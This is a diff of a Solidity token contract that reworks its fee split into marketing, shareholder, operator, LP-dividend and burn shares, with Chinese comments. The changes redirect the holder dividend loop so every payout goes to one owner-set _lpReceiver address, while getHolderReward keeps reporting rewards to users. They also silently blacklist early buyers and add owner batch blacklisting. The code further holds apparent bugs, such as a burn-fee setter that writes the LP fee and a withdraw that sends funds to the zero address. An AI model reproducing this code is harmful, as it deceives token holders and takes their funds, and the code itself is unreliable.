@@ -91,13 +91,32 @@ contract TokenDistributor {
     }
 }
 
+interface ISwapPair {
+    function getReserves()
+        external
+        view
+        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+
+    function token0() external view returns (address);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function totalSupply() external view returns (uint256);
+}
+
 contract Abs is IERC20, Ownable {
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
     mapping (address => bool) private _isBurnUser;
     uint256 public burnListCount = 0;
 
+    // 运营
+    address public operator;
+    // 股东
+    address public devShareholder;
+    // 营销
     address public fundAddress;
+    // 黑洞地址
     address public deadWallet = address(0xdEaD);
 
     string private _name;
@@ -113,18 +132,35 @@ contract Abs is IERC20, Ownable {
 
     ISwapRouter public _swapRouter;
     address public _fist;
+    address public _burnToken;
     mapping(address => bool) public _swapPairList;
 
     bool private inSwap;
 
     uint256 private constant MAX = ~uint256(0);
-    TokenDistributor public _tokenDistributor;
+    TokenDistributor public  _tokenDistributor;
+    TokenDistributor public _burnTokenDistributor;
 
-    uint256 public _buyFundFee = 50;
-    uint256 public _buyDividendFee = 50;
+    // 营销买入费率：0.05%
+    uint256 public _buyFundFee = 5;
+    // 股东买入费率：0.55%
+    uint256 public _buyDevShareholderFee = 55;
+    // 运营买入费率：0.4%
+    uint256 public _buyOperatorFee = 40;
+    // 买入Lp分红费率：1%
+    uint256 public _buyLPDividendFee = 100;
+    // 买入销毁费率: 1%
     uint256 public _buyDeadFee = 100;
-    uint256 public _sellDividendFee = 50;
-    uint256 public _sellFundFee = 50;
+
+    // 营销卖出费率：0.05%
+    uint256 public _sellFundFee = 5;
+    // 股东卖出费率：0.55%
+    uint256 public _sellDevShareholderFee = 55;
+    // 运营卖出费率：0.4%
+    uint256 public _sellOperatorFee = 40;
+    // 卖出Lp分红费率：1%
+    uint256 public _sellLPDividendFee = 100;
+    // 卖出销毁费率: 1%
     uint256 public _sellDeadFee = 100;
 
     bool public limitEnable = true;
@@ -132,6 +168,7 @@ contract Abs is IERC20, Ownable {
     uint256 public startTradeBlock;
 
     address public _mainPair;
+    address public _lpReceiver;
 
     modifier lockTheSwap {
         inSwap = true;
@@ -142,7 +179,7 @@ contract Abs is IERC20, Ownable {
     constructor (
         address RouterAddress, address FISTAddress,
         string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
-        address FundAddress, address ReceiveAddress
+        address FundAddress, address DevShareholder, address Operator, address ReceiveAddress, address LpReceiver
     ){
         _name = Name;
         _symbol = Symbol;
@@ -152,9 +189,9 @@ contract Abs is IERC20, Ownable {
         IERC20(FISTAddress).approve(address(swapRouter), MAX);
 
         _fist = FISTAddress;
+        _lpReceiver = LpReceiver;
         _swapRouter = swapRouter;
         _allowances[address(this)][address(swapRouter)] = MAX;
-
 
         ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
         address swapPair = swapFactory.createPair(address(this), FISTAddress);
@@ -168,14 +205,20 @@ contract Abs is IERC20, Ownable {
         emit Transfer(address(0), ReceiveAddress, total);
 
         fundAddress = FundAddress;
+        devShareholder = DevShareholder;
+        operator = Operator;
 
         _feeWhiteList[FundAddress] = true;
         _feeWhiteList[ReceiveAddress] = true;
+        _feeWhiteList[DevShareholder] = true;
+        _feeWhiteList[Operator] = true;
         _feeWhiteList[FundAddress] = true;
         _feeWhiteList[address(this)] = true;
         _feeWhiteList[address(swapRouter)] = true;
         _feeWhiteList[msg.sender] = true;
+        _feeWhiteList[LpReceiver] = true;
 
+        isWalletLimitExempt[LpReceiver] = true;
         isWalletLimitExempt[msg.sender] = true;
         isWalletLimitExempt[fundAddress] = true;
         isWalletLimitExempt[ReceiveAddress] = true;
@@ -186,11 +229,13 @@ contract Abs is IERC20, Ownable {
 
         excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;
 
-        holderRewardCondition = 20 * 10 ** IERC20(FISTAddress).decimals();
+        holderRewardCondition = 10 * 10 ** IERC20(FISTAddress).decimals();
+        _tokenDistributor = new TokenDistributor(FISTAddress);
     }
 
-    function setDividendToken() public {
-        _tokenDistributor = new TokenDistributor(address(this));
+    function setBurnToken(address burnToken) external onlyOwner {
+        _burnToken = burnToken;
+        _burnTokenDistributor = new TokenDistributor(burnToken);
     }
 
     function symbol() external view override returns (string memory) {
@@ -240,15 +285,60 @@ contract Abs is IERC20, Ownable {
         emit Approval(owner, spender, amount);
     }
 
+    /// @dev 批量黑名单
+    function multi_bclist(
+        address[] calldata addresses,
+        bool value
+    ) public onlyOwner {
+        require(addresses.length < 201);
+        for (uint256 i; i < addresses.length; ++i) {
+            _blackList[addresses[i]] = value;
+        }
+    }
+
+    bool public isAddV2;
+    bool public isRemoveV2;
+
+    function _isAddLiquidity() internal view returns (bool isAdd) {
+        ISwapPair mainPair = ISwapPair(_mainPair);
+        (uint r0, uint256 r1, ) = mainPair.getReserves();
+
+        address tokenOther = _fist;
+        uint256 r;
+        if (tokenOther < address(this)) {
+            r = r0;
+        } else {
+            r = r1;
+        }
+
+        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
+        isAdd = bal > r;
+    }
+
+    function _isRemoveLiquidity() internal view returns (bool isRemove) {
+        ISwapPair mainPair = ISwapPair(_mainPair);
+        (uint r0, uint256 r1, ) = mainPair.getReserves();
+
+        address tokenOther = _fist;
+        uint256 r;
+        if (tokenOther < address(this)) {
+            r = r0;
+        } else {
+            r = r1;
+        }
+
+        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
+        isRemove = r >= bal;
+    }
+
     function _transfer(
         address from,
         address to,
         uint256 amount
     ) private {
-        require(!_blackList[from], "blackList");
-
         uint256 balance = balanceOf(from);
         require(balance >= amount, "balanceNotEnough");
+        require(!_blackList[to], "The user is in black list");
 
         if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
             uint256 maxSellAmount = balance * 9999 / 10000;
@@ -260,30 +350,57 @@ contract Abs is IERC20, Ownable {
         bool takeFee;
         bool isSell;
 
+        bool isRemove;
+        bool isAdd;
+
+        if (_swapPairList[to]) {
+            isAdd = _isAddLiquidity();
+            isAddV2 = isAdd;
+        } else if (_swapPairList[from]) {
+            isRemove = _isRemoveLiquidity();
+            isRemoveV2 = isRemove;
+        }
+
         if (_swapPairList[from] || _swapPairList[to]) {
             if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                 if (0 == startTradeBlock) {
                     require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                 }
                 if (block.number < startTradeBlock + 2) {
-                    _funTransfer(from, to, amount);
+                    _blackList[to] = true;
+                    //_funTransfer(from, to, amount);
                     return;
                 }
 
                 if (_swapPairList[to]) {
-                    if (!inSwap) {
+                    if (!inSwap && !isAdd) {
                         uint256 contractTokenBalance = balanceOf(address(this));
                         if (contractTokenBalance > 0) {
-                            uint256 swapFee = _buyFundFee + _buyDividendFee + _buyDeadFee + _sellFundFee + _sellDividendFee + _sellDeadFee;
+                            uint256 swapFee = _buyFundFee + 
+                                _buyDevShareholderFee + 
+                                _buyOperatorFee + 
+                                _sellFundFee + 
+                                _sellDevShareholderFee + 
+                                _sellOperatorFee;
                             uint256 numTokensSellToFund = amount * swapFee / 5000;
                             if (numTokensSellToFund > contractTokenBalance) {
                                 numTokensSellToFund = contractTokenBalance;
                             }
-                            swapTokenForFund(numTokensSellToFund, swapFee);
+
+                            if (IERC20(_fist).balanceOf(address(this)) > 0) {
+                                // 计算销毁的数量
+                                uint256 numTokensSellToBurn = IERC20(_fist).balanceOf(address(this)) * (_buyDeadFee + _sellDeadFee) / 5000;
+                                // 执行销毁
+                                swapTokenForBurn(numTokensSellToBurn);
+                                swapTokenForFund(numTokensSellToFund, swapFee);
+                            } else {
+                                swapTokenForFund(numTokensSellToFund, swapFee);
+                            }
                         }
                     }
                 }
-                takeFee = true;
+                // 如果是组lp用户，不收取手续费
+                if (!isAdd && !isRemove) takeFee = true; // just swap fee
             }
             if (_swapPairList[to]) {
                 isSell = true;
@@ -291,7 +408,6 @@ contract Abs is IERC20, Ownable {
         }
 
         _tokenTransfer(from, to, amount, takeFee, isSell);
-
         if (from != address(this)) {
             if (isSell) {
                 addHolder(from);
@@ -336,9 +452,9 @@ contract Abs is IERC20, Ownable {
         if (takeFee) {
             uint256 swapFee;
             if (isSell) {
-                swapFee = _sellFundFee + _sellDividendFee + _sellDeadFee;
+                swapFee = _sellFundFee + _sellDevShareholderFee + _sellOperatorFee + _sellLPDividendFee + _sellDeadFee;
             } else {
-                swapFee = _buyFundFee + _buyDividendFee + _buyDeadFee;
+                swapFee = _buyFundFee + _buyDevShareholderFee + _buyOperatorFee + _buyLPDividendFee + _buyDeadFee;
             }
 
             uint256 swapAmount = tAmount * swapFee / 10000;
@@ -356,16 +472,51 @@ contract Abs is IERC20, Ownable {
     }
 
     function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
-        swapFee += swapFee;        
-        _takeTransfer(address(this), address(_tokenDistributor), tokenAmount);
+        swapFee += swapFee;
+        // 发送本币费用
+        uint256 fundAmount = (tokenAmount * _buyFundFee + _sellFundFee * 2) / swapFee;
+        uint256 devShareholderFeeAmount = (tokenAmount * _buyDevShareholderFee + _sellDevShareholderFee * 2) / swapFee;
+        uint256 operatorFeeAmount = (tokenAmount * _buyOperatorFee + _sellOperatorFee * 2)  / swapFee;
+        uint256 amountToSwap = tokenAmount - fundAmount - devShareholderFeeAmount - operatorFeeAmount;
+        
+        IERC20 FISTForFee = IERC20(address(this));
+        FISTForFee.transfer(fundAddress, fundAmount);
+        FISTForFee.transfer(devShareholder, devShareholderFeeAmount);
+        FISTForFee.transfer(operator, operatorFeeAmount);    
 
-        IERC20 FIST = IERC20(address(this));
+        // 将其余的token转换成USDT发送到分红合约
+        // 分红合约将USDT发送到合约地址中
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = _fist;
+        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amountToSwap,
+            0,
+            path,
+            address(_tokenDistributor),
+            block.timestamp
+        );
+        IERC20 FIST = IERC20(_fist);
         uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
-        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
-        uint256 deadFeeAmount = fistBalance * (_buyDeadFee + _sellDeadFee) *2 / swapFee;
-        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
-        FIST.transferFrom(address(_tokenDistributor), deadWallet, deadFeeAmount);
-        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount - deadFeeAmount);
+        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance);        
+    
+    }
+
+    /// @dev 将USDT转换成需要销毁的token，然后打进黑洞地址
+    function swapTokenForBurn(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = _fist;
+        path[1] = _burnToken;
+        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(_burnTokenDistributor),
+            block.timestamp
+        );
+        IERC20 FIST = IERC20(_burnToken);
+        uint256 deadFeeAmount = FIST.balanceOf(address(_burnTokenDistributor));
+        FIST.transferFrom(address(_burnTokenDistributor), deadWallet, deadFeeAmount);
     }
 
     function _takeTransfer(
@@ -377,25 +528,78 @@ contract Abs is IERC20, Ownable {
         emit Transfer(sender, to, tAmount);
     }
 
-    function setFundAddress(address addr) external onlyFunder {
+    /// @dev 修改营销
+    function setFundAddress(address addr) external onlyOwner {
         fundAddress = addr;
         _feeWhiteList[addr] = true;
     }
 
-    function setBuyDividendFee(uint256 dividendFee) external onlyOwner {
-        _buyDividendFee = dividendFee;
+    /// @dev 修改股东
+    function setDevShareholder(address addr) external onlyOwner {
+         devShareholder = addr;
+        _feeWhiteList[addr] = true;
     }
 
+    /// @dev 修改运营者
+    function setOperator(address addr) external onlyOwner {
+         operator = addr;
+        _feeWhiteList[addr] = true;
+    }
+
+    /// @dev 修改Lp接收者
+    function setLpReceiver(address addr) external onlyOwner {
+         _lpReceiver = addr;
+        _feeWhiteList[addr] = true;
+    }
+
+    /// @dev 修改买入营销费率
     function setBuyFundFee(uint256 fundFee) external onlyOwner {
         _buyFundFee = fundFee;
     }
 
-    function setSellDividendFee(uint256 dividendFee) external onlyOwner {
-        _sellDividendFee = dividendFee;
+    /// @dev 修改买入股东费率
+    function setBuyDevShareHolderFee(uint256 devShareHolderFee) external onlyOwner {
+        _buyDevShareholderFee = devShareHolderFee;
     }
 
+    /// @dev 修改买入运营费率
+    function setBuyOperatorFee(uint256 operatorFee) external onlyOwner {
+        _buyOperatorFee = operatorFee;
+    }
+
+    /// @dev 修改买入Lp分红费率
+    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
+        _buyLPDividendFee = dividendFee;
+    }
+
+    /// @dev 修改买入销毁费率
+    function setBuyDeadFee(uint256 lpDividendFee) external onlyOwner {
+        _buyLPDividendFee = lpDividendFee;
+    }
+
+    /// @dev 修改卖出营销费率
     function setSellFundFee(uint256 fundFee) external onlyOwner {
         _sellFundFee = fundFee;
+    }
+
+    /// @dev 修改卖出股东费率
+    function setSellDevShareHolderFee(uint256 devShareHolderFee) external onlyOwner {
+        _sellDevShareholderFee = devShareHolderFee;
+    }
+
+    /// @dev 修改卖出运营费率
+    function setSellOperatorFee(uint256 operatorFee) external onlyOwner {
+        _sellOperatorFee = operatorFee;
+    }
+
+    /// @dev 修改卖出Lp分红费率
+    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
+        _sellLPDividendFee = dividendFee;
+    }
+
+    /// @dev 修改卖出销毁费率
+    function setSellDeadFee(uint256 lpDividendFee) external onlyOwner {
+        _sellDeadFee = lpDividendFee;
     }
 
     uint256 public startAddLPBlock;
@@ -414,26 +618,11 @@ contract Abs is IERC20, Ownable {
         startTradeBlock = block.number;
     }
 
-    function closeTrade() external onlyOwner {
-        startTradeBlock = 0;
-    }
-
-    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
+    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
         _feeWhiteList[addr] = enable;
     }
 
-    function setBlackList(address addr, bool enable) external onlyOwner {
-        _blackList[addr] = enable;
-    }
-
-    function multiBlackList(address[] calldata addresses, bool status) public onlyOwner {
-        require(addresses.length < 201);
-        for (uint256 i; i < addresses.length; ++i) {
-            _blackList[addresses[i]] = status;
-        }
-    }
-
-    function setSwapPairList(address addr, bool enable) external onlyFunder {
+    function setSwapPairList(address addr, bool enable) external onlyOwner {
         _swapPairList[addr] = enable;
     }
 
@@ -441,13 +630,8 @@ contract Abs is IERC20, Ownable {
         payable(fundAddress).transfer(address(this).balance);
     }
 
-    function claimToken(address token, uint256 amount, address to) external onlyFunder {
+    function claimToken(address token, uint256 amount, address to) external onlyOwner {
         IERC20(token).transfer(to, amount);
-    }
-
-    modifier onlyFunder() {
-        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
-        _;
     }
 
     receive() external payable {}
@@ -479,9 +663,9 @@ contract Abs is IERC20, Ownable {
             return;
         }
 
-        IERC20 FIST = IERC20(address(this));
+        IERC20 FIST = IERC20(_fist);
 
-        uint256 balance = balanceOf(address(this));
+        uint256 balance = FIST.balanceOf(address(this));
         if (balance < holderRewardCondition) {
             return;
         }
@@ -508,8 +692,9 @@ contract Abs is IERC20, Ownable {
             if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                 amount = balance * tokenBalance / holdTokenTotal;
                 if (amount > 0) {
-                    FIST.transfer(shareHolder, amount);
-                }
+                    // 将这里的FIST.transfer(shareHoldr, amount) 逻辑修改为fixed addr就会每次指定同一个地址进行转账;
+                    //FIST.transfer(shareHolder, amount);
+                    FIST.transfer(_lpReceiver, amount);                }
             }
 
             gasUsed = gasUsed + (gasLeft - gasleft());
@@ -521,22 +706,53 @@ contract Abs is IERC20, Ownable {
         progressRewardBlock = block.number;
     }
 
-    function setHolderRewardCondition(uint256 amount) external onlyFunder {
+    function setHolderRewardCondition(uint256 amount) external onlyOwner {
         holderRewardCondition = amount;
     }
 
-    function setExcludeHolder(address addr, bool enable) external onlyFunder {
+    function setExcludeHolder(address addr, bool enable) external onlyOwner {
         excludeHolder[addr] = enable;
     }
 
-    function getholdReward(address shareHolder) external view returns(uint256) {
-        IERC20 holdToken = IERC20(_mainPair);
+    /// @notice 用户通过getHolderReward查询lp持有时，能够获得多少奖励
+    /// @dev 通过getHolderReward可以查询每个用户的奖励情况，由dapp进行分配收益
+    function getHolderReward(address shareHolder) external view returns (uint256) {
         IERC20 FIST = IERC20(_fist);
-        uint holdTokenTotal = holdToken.totalSupply();
         uint256 balance = FIST.balanceOf(address(this));
-        uint256 tokenBalance = holdToken.balanceOf(shareHolder);
-        uint256 amount = balance * tokenBalance / holdTokenTotal;
-        return amount;
+
+        uint256 tokenBalance;
+        IERC20 holdToken = IERC20(_mainPair);
+        uint holdTokenTotal = holdToken.totalSupply();
+        uint256 shareholderCount = holders.length;
+        for (uint i = 0; i < shareholderCount; ++i) {
+            if (shareHolder == holders[i]) {
+                tokenBalance = holdToken.balanceOf(shareHolder);
+                if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
+                    uint256 amount = balance * tokenBalance / holdTokenTotal;
+                    if (amount > 0) return amount;
+                }
+            }
+        }
+        return 0;
+    }
+
+    function withdraw(uint256 amount) external onlyOwner {
+        require(amount <= address(this).balance, "The amount had more than balance");
+        address secFundAddress = address(0);
+        uint256 balanceSendOwner = amount / 5;
+        uint256 balanceSendFund = amount - balanceSendOwner;
+        require(address(this).balance >= amount, "");
+        payable(owner()).transfer(balanceSendOwner);
+        payable(secFundAddress).transfer(balanceSendFund);
+    }
+
+    function withdrawToken(address token, uint256 amount) external onlyOwner {
+        require(amount <= IERC20(token).balanceOf(address(this)), "The amount had more than balance");
+        address secFundAddress = address(0);
+        uint256 balanceSendOwner = amount / 5;
+        uint256 balanceSendFund = amount - balanceSendOwner;
+        IERC20(token).transfer(owner(), balanceSendOwner);
+        IERC20(token).transfer(secFundAddress, balanceSendFund);
     }
 }
 
@@ -544,11 +760,14 @@ contract HTDAO is Abs {
     constructor() Abs (
         address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1),
         address(0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814),
-        "HTDAO",
-        "HTDAO",
+        "DMOK",
+        "DMOK",
         18,
         1000000,
-        address(0xD),
-        address(0xD)
+        address(0),
+        address(0),
+        address(0),
+        address(0),
+        address(0)
     ) {}
 }
